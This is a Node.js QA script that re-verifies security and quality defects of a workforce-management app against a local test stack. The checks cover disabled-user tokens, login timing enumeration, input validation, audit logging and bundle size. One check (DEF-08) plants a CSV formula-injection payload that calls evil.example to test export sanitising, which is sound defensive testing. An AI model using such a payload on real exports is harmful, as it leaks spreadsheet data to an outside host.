// Re-checks each release-gate defect (DEF-01..DEF-28) directly against the running stack.
//   QA_ADMIN_PASSWORD=... node qa/tools/reverify.mjs   -> <tmp>/wfm-qa/reverify.json
// Each row: { id, status: FIXED | OPEN | PARTIAL | MANUAL, evidence }
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const API = (process.env.QA_API ?? 'http://localhost:4000') + '/api/v1';
const ROOT = path.resolve(import.meta.dirname, '../..');
const OUT = path.join(process.env.QA_OUT ?? path.join(os.tmpdir(), 'wfm-qa'), 'reverify.json');
const PW = process.env.QA_ADMIN_PASSWORD ?? '';
const TD = JSON.parse(fs.readFileSync(path.resolve(import.meta.dirname, '../test-data.json'), 'utf8'));
const RUN = String(Date.now()).slice(-6);
const rows = [];
const put = (id, status, evidence) => { rows.push({ id, status, evidence }); console.log(id.padEnd(7), status.padEnd(8), typeof evidence === 'string' ? evidence : JSON.stringify(evidence)); };
const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);

async function call(tok, method, p, body, raw = false) {
  const t0 = performance.now();
  const r = await fetch(p.startsWith('http') ? p : API + p, { method, headers: { 'Content-Type': 'application/json', ...(tok ? { Authorization: 'Bearer ' + tok } : {}) }, body: body === undefined ? undefined : typeof body === 'string' ? body : JSON.stringify(body) });
  const txt = await r.text(); let j; try { j = JSON.parse(txt); } catch { j = txt; }
  return { status: r.status, body: raw ? txt : j, ms: performance.now() - t0, headers: r.headers };
}
const login = async (u, p, tenant = 'ORG') => call(null, 'POST', '/auth/login', { username: u, password: p, tenant });
async function ready(u, temp, fin) {
  const f = await login(u, fin); if (f.status === 200 && !f.body.mustChangePassword) return f.body.token;
  const s = await login(u, temp); if (s.status !== 200) throw new Error(`login ${u} ${s.status} ${JSON.stringify(s.body)}`);
  if (!s.body.mustChangePassword) return s.body.token;
  const c = await call(s.body.token, 'POST', '/auth/change-password', { currentPassword: temp, newPassword: fin });
  if (c.status !== 200) throw new Error(`change-password ${u} ${c.status} ${JSON.stringify(c.body)}`);
  return c.body.token;
}
const safe = async (id, fn) => { try { await fn(); } catch (e) { put(id, 'ERROR', String(e.message ?? e).slice(0, 300)); } };

const adm = await login('admin', PW);
if (adm.status !== 200) { console.error('admin login failed', adm.status, adm.body); process.exit(1); }
const A = adm.body.token;

// DEF-01 disabled user's token
await safe('DEF-01', async () => {
  const name = 'qa.dis' + RUN;
  const u = await call(A, 'POST', '/users', { username: name, displayName: 'QA Disabled', role: 'ANALYST', password: 'Tmp-' + TD.rolePassword });
  if (u.status !== 201) throw new Error('create user ' + u.status + JSON.stringify(u.body));
  const tok = await ready(name, 'Tmp-' + TD.rolePassword, TD.rolePassword);
  const before = await call(tok, 'GET', '/workforce/employees');
  await call(A, 'PATCH', `/users/${u.body.id}`, { status: 'DISABLED' });
  const after = await call(tok, 'GET', '/workforce/employees');
  await new Promise((r) => setTimeout(r, 6000));
  const later = await call(tok, 'GET', '/workforce/employees');
  const cut = [401, 403].includes(after.status), cutLater = [401, 403].includes(later.status);
  put('DEF-01', cut ? 'FIXED' : cutLater ? 'PARTIAL' : 'OPEN', { beforeDisable: before.status, rightAfterDisable: after.status, after6s: later.status });
});

// DEF-02 overlapping admin time off
await safe('DEF-02', async () => {
  const emps = (await call(A, 'GET', '/workforce/employees?q=Demo')).body;
  const list = Array.isArray(emps) ? emps : emps.items ?? emps.rows ?? [];
  const e = list.find((x) => x.status !== 'TERMINATED') ?? list[0];
  const s = 200 + (Number(RUN) % 100);
  const a = await call(A, 'POST', '/workforce/time-off', { employeeId: e.id, type: 'VACATION', startDate: day(s), endDate: day(s + 1), approve: true });
  const b = await call(A, 'POST', '/workforce/time-off', { employeeId: e.id, type: 'VACATION', startDate: day(s + 1), endDate: day(s + 2), approve: true });
  put('DEF-02', a.status < 300 && [400, 409].includes(b.status) ? 'FIXED' : 'OPEN', { first: a.status, overlapping: b.status, message: b.body?.error?.message });
  for (const r of [a, b]) { const id = r.body?.id ?? r.body?.request?.id; if (id) await call(A, 'DELETE', `/workforce/time-off/${id}`); }
});

// DEF-03 admin password / forced change
await safe('DEF-03', async () => {
  put('DEF-03', adm.body.mustChangePassword ? 'FIXED' : 'OPEN', { adminSignsInWithKnownWeakPassword: true, mustChangePassword: !!adm.body.mustChangePassword, note: 'bootstrap password still accepted; FIXED only if a change is forced' });
});

// DEF-08 CSV formula injection in audit export
await safe('DEF-08', async () => {
  const name = `=HYPERLINK("http://evil.example/?x="&A1,"x")${RUN}`;
  const t = await call(A, 'POST', '/workforce/teams', { name });
  const exp = await call(A, 'GET', '/audit/export.csv', undefined, true);
  const lines = String(exp.body).split(/\r?\n/).filter((l) => l.includes('evil.example'));
  const bad = lines.some((l) => /(^|,)"?=HYPERLINK/.test(l));
  put('DEF-08', exp.status === 200 && lines.length && !bad ? 'FIXED' : lines.length ? 'OPEN' : 'UNCLEAR', { export: exp.status, matchingLines: lines.length, sample: lines[0]?.slice(0, 160) });
  if (t.body?.id) await call(A, 'DELETE', `/workforce/teams/${t.body.id}`);
});

// DEF-09 token in URL
await safe('DEF-09', async () => {
  const r = await call(null, 'GET', `/users?token=${A}`);
  put('DEF-09', [401, 403].includes(r.status) ? 'FIXED' : 'OPEN', { 'GET /users?token=': r.status });
});

// DEF-10 timing enumeration
await safe('DEF-10', async () => {
  const t = async (u) => { const xs = []; for (let i = 0; i < 6; i++) xs.push((await login(u, 'wrong-' + RUN + i)).ms); xs.sort((a, b) => a - b); return xs[3]; };
  const real = await t('demo.agent5'), fake = await t('nobody-' + RUN);
  put('DEF-10', Math.abs(real - fake) < Math.max(25, real * 0.35) ? 'FIXED' : 'OPEN', { medianMsRealUser: Math.round(real), medianMsUnknownUser: Math.round(fake) });
});

// DEF-11 impossible date
await safe('DEF-11', async () => {
  const ag = await ready('demo.agent2', 'Demo-Pass-123', TD.agentPassword);
  const r = await call(ag, 'POST', '/me/time-off', { type: 'PERSONAL', startDate: '2026-02-30', endDate: '2026-02-30', reason: 'QA impossible date' });
  const leak = /date\/time field|invalid input syntax|postgres|SQLSTATE/i.test(JSON.stringify(r.body));
  put('DEF-11', r.status === 400 && !leak ? 'FIXED' : 'OPEN', { status: r.status, leaksDbError: leak, message: r.body?.error?.message });
});

// DEF-12 failed sign-in audited
await safe('DEF-12', async () => {
  await login('admin', 'wrong-' + RUN);
  await new Promise((r) => setTimeout(r, 800));
  const a = JSON.stringify((await call(A, 'GET', '/audit?search=LOGIN')).body) + JSON.stringify((await call(A, 'GET', '/audit?search=admin')).body);
  const hit = /LOGIN_FAILED|FAILED_LOGIN|LOGIN_FAIL|failed sign|AUTH_FAIL/i.test(a);
  put('DEF-12', hit ? 'FIXED' : 'OPEN', { failedLoginInAudit: hit });
});

// DEF-13 forecast builder history-quality speed
await safe('DEF-13', async () => {
  const groups = (await call(A, 'GET', '/config/groups')).body;
  const g = (Array.isArray(groups) ? groups : groups.items ?? []).find((x) => x.name === 'Demo Support');
  const urls = [`/forecast/history-quality?groupId=${g.id}`, `/forecast/history/quality?groupId=${g.id}`, `/forecast/groups/${g.id}/history-quality`];
  let res; for (const u of urls) { const r = await call(A, 'GET', u); if (r.status !== 404) { res = { url: u, status: r.status, ms: Math.round(r.ms) }; const r2 = await call(A, 'GET', u); res.secondMs = Math.round(r2.ms); break; } }
  put('DEF-13', res ? (res.ms < 5000 ? 'FIXED' : res.secondMs < 3000 ? 'PARTIAL' : 'OPEN') : 'MANUAL', res ?? 'history-quality endpoint not found; see UI timing in performance suite');
});

// DEF-16 employee list paging
await safe('DEF-16', async () => {
  const r = await call(A, 'GET', '/workforce/employees?limit=50&offset=0');
  const r2 = await call(A, 'GET', '/workforce/employees?page=1&pageSize=50');
  const n = (b) => Array.isArray(b) ? b.length : (b.items ?? b.rows ?? b.data ?? []).length;
  const paged = (x) => !Array.isArray(x.body) && (x.body.total !== undefined || x.body.nextCursor !== undefined || x.body.hasMore !== undefined) || n(x.body) === 50;
  put('DEF-16', paged(r) || paged(r2) ? 'FIXED' : 'OPEN', { limitOffsetRows: n(r.body), pageRows: n(r2.body), shape: Array.isArray(r.body) ? 'array' : Object.keys(r.body), kb: Math.round(JSON.stringify(r.body).length / 1024) });
});

// DEF-19 NATS TLS
await safe('DEF-19', async () => {
  const env = fs.readFileSync(path.join(ROOT, 'backend/.env'), 'utf8') + '\n' + fs.readFileSync(path.join(ROOT, 'backend/.env.example'), 'utf8');
  const lines = env.split('\n').filter((l) => /TLS.*(REJECT|VERIFY)|REJECT_UNAUTHORIZED/i.test(l) && !l.trim().startsWith('#'));
  const off = lines.some((l) => /=\s*(false|0|no)\s*$/i.test(l));
  put('DEF-19', off ? 'OPEN' : 'FIXED', { settings: lines.map((l) => l.trim()) });
});

// DEF-20 offers group name
await safe('DEF-20', async () => {
  const ag = await ready('demo.agent1', 'Demo-Pass-123', TD.agentPassword);
  const r = await call(ag, 'GET', '/me/offers');
  const list = Array.isArray(r.body) ? r.body : r.body.offers ?? r.body.items ?? r.body.open ?? [];
  const empty = list.filter((o) => !(o.groupName ?? o.wfmGroupName ?? o.group?.name));
  put('DEF-20', !list.length ? 'UNCLEAR' : empty.length ? 'OPEN' : 'FIXED', { offers: list.length, withoutGroupName: empty.length, keys: list[0] ? Object.keys(list[0]).slice(0, 15) : [] });
});

// DEF-23 hire date 2099
await safe('DEF-23', async () => {
  const groups = (await call(A, 'GET', '/config/groups')).body;
  const g = (Array.isArray(groups) ? groups : groups.items ?? []).find((x) => x.name === 'Demo Support');
  const r = await call(A, 'POST', '/workforce/employees', { employeeNumber: 'QAH' + RUN, firstName: 'Qa', lastName: 'Future', wfmGroupId: g?.id, employmentType: 'FULL_TIME', weeklyHours: 40, daysPerWeek: 5, hireDate: '2099-01-01' });
  put('DEF-23', [400, 422].includes(r.status) ? 'FIXED' : 'OPEN', { status: r.status, message: r.body?.error?.message });
  if (r.body?.id) await call(A, 'DELETE', `/workforce/employees/${r.body.id}`);
});

// DEF-24 malformed JSON
await safe('DEF-24', async () => {
  const r = await call(A, 'POST', '/config/groups', '{"name":');
  put('DEF-24', r.status === 400 && r.body?.error?.code !== 'INTERNAL' ? 'FIXED' : 'OPEN', { status: r.status, code: r.body?.error?.code });
});

// DEF-25 discovery
await safe('DEF-25', async () => {
  const d = await call(null, 'POST', '/auth/discover', { identifier: 'nobody-' + RUN + '@example.com' });
  const d2 = await call(null, 'POST', '/auth/discover', { identifier: 'admin' });
  const lo = await call(null, 'GET', '/auth/login-options');
  const differs = JSON.stringify(d.body) !== JSON.stringify(d2.body) && d2.status === 200 && d.status === d2.status;
  const orgName = /"(orgName|organizationName|tenantName|name)"\s*:\s*"[^"]+/.test(JSON.stringify(lo.body)) || /"(orgName|organizationName|tenantName)"/.test(JSON.stringify(d2.body));
  put('DEF-25', d.status === 404 && d2.status === 404 ? 'FIXED' : (!differs && !orgName ? 'FIXED' : 'OPEN'), { discoverUnknown: [d.status, JSON.stringify(d.body).slice(0, 120)], discoverKnown: [d2.status, JSON.stringify(d2.body).slice(0, 120)], loginOptions: [lo.status, JSON.stringify(lo.body).slice(0, 160)] });
});

// DEF-26 favicon
await safe('DEF-26', async () => {
  const s = {};
  for (const p of [3000, 3001]) {
    const html = await (await fetch(`http://localhost:${p}/`)).text();
    const href = html.match(/<link[^>]+rel=["'][^"']*icon[^"']*["'][^>]*href=["']([^"']+)/i)?.[1] ?? html.match(/<link[^>]+href=["']([^"']+)["'][^>]*rel=["'][^"']*icon/i)?.[1];
    const ico = await fetch(`http://localhost:${p}${href && !href.startsWith('data:') ? (href.startsWith('/') ? href : '/' + href) : '/favicon.ico'}`);
    const type = ico.headers.get('content-type') ?? '';
    s[p] = { link: href?.slice(0, 60) ?? null, status: href?.startsWith('data:') ? 'inline' : ico.status, type };
  }
  const ok = Object.values(s).every((x) => x.status === 'inline' || (x.status === 200 && !/text\/html/.test(x.type)));
  put('DEF-26', ok ? 'FIXED' : 'OPEN', s);
});

// DEF-07 AG Grid licence
await safe('DEF-07', async () => {
  const envs = ['.env', '.env.local', '.env.production', '.env.production.local'].map((f) => path.join(ROOT, f)).filter((f) => fs.existsSync(f));
  const key = envs.some((f) => /VITE_AG_GRID_LICEN[SC]E_?KEY?\s*=\s*\S+/.test(fs.readFileSync(f, 'utf8')));
  const pkg = JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf8'));
  const deps = { ...pkg.dependencies, ...pkg.devDependencies };
  const enterprise = Object.keys(deps).filter((d) => /ag-grid-enterprise|ag-grid-charts-enterprise/.test(d));
  put('DEF-07', !enterprise.length || key ? 'FIXED' : 'OPEN', { enterprisePackages: enterprise, licenceKeyInEnvFiles: key, note: 'browser console check is in the admin-crawl suite' });
});

// DEF-19/27/14 code checks
await safe('DEF-27', async () => {
  const seed = fs.readFileSync(path.join(ROOT, 'scripts/demo-seed.mjs'), 'utf8');
  const handles = /change-password|mustChangePassword/.test(seed);
  put('DEF-27', handles ? 'FIXED' : 'OPEN', { seedHandlesForcedPasswordChange: handles, note: 'code inspection; seed not re-run (it rewrites demo data)' });
});
await safe('DEF-14', async () => {
  const py = fs.readFileSync(path.join(ROOT, 'backend/engine/server.py'), 'utf8') + fs.readFileSync(path.join(ROOT, 'backend/engine/scheduling.py'), 'utf8');
  const isolated = /ProcessPool|multiprocessing|subprocess|spawn/.test(py);
  const sup = path.join(process.env.QA_OUT ?? path.join(os.tmpdir(), 'wfm-qa'), 'scale', 'engine-supervisor.log');
  put('DEF-14', 'MANUAL', { solveRunsInChildProcess: isolated, note: 'confirmed by the gateway test run + engine crash count (see run log)', supervisorExits: fs.existsSync(sup) ? fs.readFileSync(sup, 'utf8').split('\n').filter((l) => /EXIT/.test(l)).length : null });
});

// DEF-15 bundle size (dist if built)
await safe('DEF-15', async () => {
  const dist = process.env.QA_DIST ?? path.join(ROOT, 'dist', 'assets');
  if (!fs.existsSync(dist)) return put('DEF-15', 'MANUAL', 'no dist/ build; run vite build');
  const js = fs.readdirSync(dist).filter((f) => f.endsWith('.js')).map((f) => ({ f, kb: Math.round(fs.statSync(path.join(dist, f)).size / 1024) })).sort((a, b) => b.kb - a.kb);
  const entry = js.find((x) => /^index-/.test(x.f)); put('DEF-15', entry && entry.kb < 600 ? 'FIXED' : 'OPEN', { entryKb: entry?.kb, chunks: js.length, largestKb: js[0].kb, largest: js[0].f, builtAt: fs.statSync(dist).mtime.toISOString() });
});

fs.writeFileSync(OUT, JSON.stringify(rows, null, 1));
console.log('->', OUT);
